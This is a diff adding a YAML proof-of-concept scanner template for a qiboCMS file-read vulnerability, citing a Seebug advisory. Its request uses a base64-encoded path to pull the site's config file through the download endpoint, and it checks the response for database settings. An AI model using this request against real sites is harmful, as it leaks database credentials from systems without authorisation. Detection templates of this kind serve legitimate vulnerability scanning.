@@ -1,0 +1,16 @@
+name: poc-yaml-qiboCMS-readfile
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("webdb"))
+expression: r0()
+detail:
+    author: 2husky
+    links:
+        - https://www.seebug.org/vuldb/ssvid-89514
